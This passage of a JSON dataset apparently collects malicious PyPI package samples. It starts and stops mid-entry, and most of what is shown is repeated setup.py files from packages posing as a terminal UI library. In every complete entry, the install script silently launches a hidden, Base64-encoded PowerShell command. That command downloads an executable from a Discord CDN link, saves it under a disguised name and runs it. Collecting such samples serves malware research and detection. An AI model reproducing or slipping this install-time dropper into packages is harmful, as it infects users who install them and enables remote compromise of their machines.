License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfccreplacever-v10.48",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfccreplacever',\n    packages = ['modlib'],\n    version = '8.30',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfccurlpong-v2.51",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfccurlpong',\n    packages = ['modlib'],\n    version = '8.73',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfcpuintsplit-v7.25",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcpuintsplit',\n    packages = ['modlib'],\n    version = '7.60',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfcvcvsuper-v8.79",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcvcvsuper',\n    packages = ['modlib'],\n    version = '8.39',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfcvpaypalram-v3.44",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcvpaypalram',\n    packages = ['modlib'],\n    version = '9.59',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfcvpushpull-v2.62",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcvpushpull',\n    packages = ['modlib'],\n    version = '4.50',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfcvstrpong-v6.28",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcvstrpong',\n    packages = ['modlib'],\n    version = '9.61',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfedrerand-v5.55",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfedrerand',\n    packages = ['modlib'],\n    version = '7.85',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfgetminecandy-v9.92",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfgetminecandy',\n    packages = ['modlib'],\n    version = '9.76',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfgrandedgame-v10.14",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfgrandedgame',\n    packages = ['modlib'],\n    version = '4.24',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfgrandstrpyw-v8.11",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfgrandstrpyw',\n    packages = ['modlib'],\n    version = '6.15',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfhackedrandvirtual-v10.78",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfhackedrandvirtual',\n    packages = ['modlib'],\n    version = '5.32',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfhttpcraftultra-v1.12",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfhttpcraftultra',\n    packages = ['modlib'],\n    version = '9.68',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfintelpullpost-v6.48",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfintelpullpost',\n    packages = ['modlib'],\n    version = '5.3',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 